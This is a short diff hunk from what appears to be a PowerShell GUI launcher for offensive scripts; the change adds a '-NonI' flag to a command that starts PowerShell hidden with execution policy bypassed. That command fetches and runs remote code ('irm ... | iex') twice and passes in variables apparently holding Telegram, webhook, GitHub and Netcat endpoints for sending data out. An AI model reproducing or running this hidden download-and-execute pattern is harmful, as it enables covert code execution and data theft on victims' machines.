@@ -258,7 +258,7 @@ $startButton.Add_Click({
     }
     Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
     if(($hiddenbox.Checked) -and ($selectedItem -notlike "*Console*") -and ($selectedItem -notlike "*LAN*")){
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -NonI -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
         Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
     }
     else{
